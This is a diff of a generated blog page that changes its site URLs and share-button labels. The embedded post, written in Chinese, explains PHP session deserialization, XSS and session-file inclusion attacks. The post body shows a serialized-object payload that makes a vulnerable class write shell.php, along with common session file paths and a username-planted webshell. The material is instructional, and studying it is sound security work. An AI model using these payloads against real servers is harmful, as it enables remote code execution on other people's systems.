@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\n序列化机制基础知识php的三种序列化机制\n12345php_binary:键名的长度对应的ASCII字符+键名+键值经过serialize()函数序列化处理的值php:键名+竖线+键值经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4):经过serialize()函数序列化处理的值\n\n如何设置序列化方式\n12ini_set(&apos;session.serialize_handler&apos;, &apos;需要设置的引擎&apos;);session_start(&apos;serialize_handler=需要设置的引擎&apos;)\n\n看一下三种方式存储的结果\n测试代码\n1234567&lt;?phpini_set('session.serialize_handler', 'php_serialize');#ini_set('session.serialize_handler', 'php');#ini_set('session.serialize_handler', 'php_binary');session_start();$_SESSION['user']=$_POST['user'];?&gt;\n\n分别看一下三种方式产生的结果\n123a:1:&#123;s:4:\"user\";s:4:\"name\";&#125;  //php_serializeuser|s:4:\"name\";      //php\u0004users:4:\"name\";  //php_binary最前面那里乱码了\n\n分析过程php_serialize这种存储方式恰好是类 数组等使用的一种序列化方式，但是就算输入类和数组，也会被当作字符串给序列化，然后存起来。无法达到反序列化攻击的目的。\n但是php这种序列化方式 被| 给分成两部分，前面一部分是键名，后一部分是经过serialize序列化的数据，当反序列化时，先找到| ，把竖线|之前的当作键，竖线|之后的当作值，也就是说 通过一个竖线把结果分成两部分，而且还是互不影响的那种， \n所以可以通过php_serialize传入值，在加上一个竖线| ，伪造这样一串数据，\n1s:5:&quot;|code&quot;;\n\n这串数据当被php这种序列化方式解析的时候，键就变成了 s:5:”|  值就变成了 code 也就是值不再被当作字符串，而是单独的一部分被反序列化\n测试一下测试代码\nhint.php\n12345&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['user'] = $_POST['user'];?&gt;\n\nhint2.php\n12345678910111213&lt;?php#ini_set('session.serialize_handler','php');session_start();class user&#123;    public $test;    function __wakeup()&#123;        $file = fopen(\"shell.php\",\"w\");        fputs($file,$this-&gt;test);        fclose($file);    &#125;&#125;?&gt;\n\nphp默认是以php作为序列化方式的，所以上面那行代码可以不加\n访问hint.php post以下内容\n1user=|O:4:\"user\":1:&#123;s:4:\"test\";s:17:\"&lt;?php phpinfo()?&gt;\";&#125;\n\nsession文件中的结果\n1a:1:&#123;s:4:\"user\";s:52:\"|O:4:\"user\":1:&#123;s:4:\"test\";s:17:\"&lt;?php phpinfo()?&gt;\";&#125;\";&#125;\n\n再去访问一下hint2.php 触发反序列化 \n这里说明一下为什么最后的三个字符”;}不影响反序列化，当反序列化足够多的字符时，剩下的数据，会被抛弃 前面有s:17的字符个数限制，所以当反序列化17个字符的时候，后面的就被仍掉了\n可以看到shell.php文件已经生成，访问一下看看\n\nxss测试代码\n12345&lt;?phpsession_start();$_SESSION['user'] = $_POST['user'];?&gt;&lt;?php echo \"hello\".$_SESSION['user'];?&gt;\n\n结果\n\n防御转义一下 就好了\n1htmlspecialchars($_SESSION['user'])\n\nsession包含常见的session存放路径1234/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID\n\n这里的PHPSESSID就是cookie中的PHPSESSID，session会记录当前账号的一下信息，比如用户名，密码等\n直接把用户名注册成一句话木马，然后利用文件包含去解析木马,就可以了，主要在于找到session的存放路径，\nsession的路径可以在phpinfo中查看，当然这里也受限于open_basedir disable_function\n测试测试代码\ntest.php\n123&lt;?phpinclude($_GET['file']);?&gt;\n\nhint.php\n1234&lt;?phpsession_start();$_SESSION['user'] = $_POST['user'];?&gt;\n\npost hint.php\n1user=&lt;?php phpinfo();?&gt;\n\n查一下phpsessid，直接去cookie里面看就行\nj7cv8kptv1mitmsau95dm4svk7\nsession文件中的内容\n1user|s:18:\"&lt;?php phpinfo();?&gt;\";\n\n包含一下\n\n","dateCreated":"2019-09-24T20:34:03+08:00","dateModified":"2019-09-25T09:36:45+08:00","datePublished":"2019-09-24T20:34:03+08:00","description":"","headline":"php-session","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/24/php-session/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/09/24/php-session/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\n序列化机制基础知识php的三种序列化机制\n12345php_binary:键名的长度对应的ASCII字符+键名+键值经过serialize()函数序列化处理的值php:键名+竖线+键值经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4):经过serialize()函数序列化处理的值\n\n如何设置序列化方式\n12ini_set(&apos;session.serialize_handler&apos;, &apos;需要设置的引擎&apos;);session_start(&apos;serialize_handler=需要设置的引擎&apos;)\n\n看一下三种方式存储的结果\n测试代码\n1234567&lt;?phpini_set('session.serialize_handler', 'php_serialize');#ini_set('session.serialize_handler', 'php');#ini_set('session.serialize_handler', 'php_binary');session_start();$_SESSION['user']=$_POST['user'];?&gt;\n\n分别看一下三种方式产生的结果\n123a:1:&#123;s:4:\"user\";s:4:\"name\";&#125;  //php_serializeuser|s:4:\"name\";      //php\u0004users:4:\"name\";  //php_binary最前面那里乱码了\n\n分析过程php_serialize这种存储方式恰好是类 数组等使用的一种序列化方式，但是就算输入类和数组，也会被当作字符串给序列化，然后存起来。无法达到反序列化攻击的目的。\n但是php这种序列化方式 被| 给分成两部分，前面一部分是键名，后一部分是经过serialize序列化的数据，当反序列化时，先找到| ，把竖线|之前的当作键，竖线|之后的当作值，也就是说 通过一个竖线把结果分成两部分，而且还是互不影响的那种， \n所以可以通过php_serialize传入值，在加上一个竖线| ，伪造这样一串数据，\n1s:5:&quot;|code&quot;;\n\n这串数据当被php这种序列化方式解析的时候，键就变成了 s:5:”|  值就变成了 code 也就是值不再被当作字符串，而是单独的一部分被反序列化\n测试一下测试代码\nhint.php\n12345&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['user'] = $_POST['user'];?&gt;\n\nhint2.php\n12345678910111213&lt;?php#ini_set('session.serialize_handler','php');session_start();class user&#123;    public $test;    function __wakeup()&#123;        $file = fopen(\"shell.php\",\"w\");        fputs($file,$this-&gt;test);        fclose($file);    &#125;&#125;?&gt;\n\nphp默认是以php作为序列化方式的，所以上面那行代码可以不加\n访问hint.php post以下内容\n1user=|O:4:\"user\":1:&#123;s:4:\"test\";s:17:\"&lt;?php phpinfo()?&gt;\";&#125;\n\nsession文件中的结果\n1a:1:&#123;s:4:\"user\";s:52:\"|O:4:\"user\":1:&#123;s:4:\"test\";s:17:\"&lt;?php phpinfo()?&gt;\";&#125;\";&#125;\n\n再去访问一下hint2.php 触发反序列化 \n这里说明一下为什么最后的三个字符”;}不影响反序列化，当反序列化足够多的字符时，剩下的数据，会被抛弃 前面有s:17的字符个数限制，所以当反序列化17个字符的时候，后面的就被仍掉了\n可以看到shell.php文件已经生成，访问一下看看\n\nxss测试代码\n12345&lt;?phpsession_start();$_SESSION['user'] = $_POST['user'];?&gt;&lt;?php echo \"hello\".$_SESSION['user'];?&gt;\n\n结果\n\n防御转义一下 就好了\n1htmlspecialchars($_SESSION['user'])\n\nsession包含常见的session存放路径1234/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID\n\n这里的PHPSESSID就是cookie中的PHPSESSID，session会记录当前账号的一下信息，比如用户名，密码等\n直接把用户名注册成一句话木马，然后利用文件包含去解析木马,就可以了，主要在于找到session的存放路径，\nsession的路径可以在phpinfo中查看，当然这里也受限于open_basedir disable_function\n测试测试代码\ntest.php\n123&lt;?phpinclude($_GET['file']);?&gt;\n\nhint.php\n1234&lt;?phpsession_start();$_SESSION['user'] = $_POST['user'];?&gt;\n\npost hint.php\n1user=&lt;?php phpinfo();?&gt;\n\n查一下phpsessid，直接去cookie里面看就行\nj7cv8kptv1mitmsau95dm4svk7\nsession文件中的内容\n1user|s:18:\"&lt;?php phpinfo();?&gt;\";\n\n包含一下\n\n","dateCreated":"2019-09-24T20:34:03+08:00","dateModified":"2019-09-25T09:36:45+08:00","datePublished":"2019-09-24T20:34:03+08:00","description":"","headline":"php-session","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/09/24/php-session/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/09/24/php-session/"}</script>
     <meta name="description" content="序列化机制基础知识php的三种序列化机制 12345php_binary:键名的长度对应的ASCII字符+键名+键值经过serialize()函数序列化处理的值php:键名+竖线+键值经过serialize()函数序列处理的值php_serialize(php&amp;gt;5.5.4):经过serialize()函数序列化处理的值  如何设置序列化方式 12ini_set(&amp;apos;session">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="php-session">
-<meta property="og:url" content="http://yoursite.com/2019/09/24/php-session/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/09/24/php-session/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="序列化机制基础知识php的三种序列化机制 12345php_binary:键名的长度对应的ASCII字符+键名+键值经过serialize()函数序列化处理的值php:键名+竖线+键值经过serialize()函数序列处理的值php_serialize(php&amp;gt;5.5.4):经过serialize()函数序列化处理的值  如何设置序列化方式 12ini_set(&amp;apos;session">
 <meta property="og:locale" content="zh-cn">
@@ -323,7 +323,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -334,7 +334,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/24/php-session/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/24/php-session/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -347,7 +347,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/24/php-session/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/24/php-session/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -360,7 +360,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/24/php-session/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/24/php-session/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -373,7 +373,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -438,7 +438,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -449,7 +449,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/24/php-session/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/24/php-session/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -462,7 +462,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/24/php-session/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/24/php-session/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -475,7 +475,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/24/php-session/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/24/php-session/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -488,7 +488,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -509,7 +509,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/24/php-session/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/24/php-session/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -522,7 +522,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/24/php-session/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/24/php-session/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -535,7 +535,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/24/php-session/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/24/php-session/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
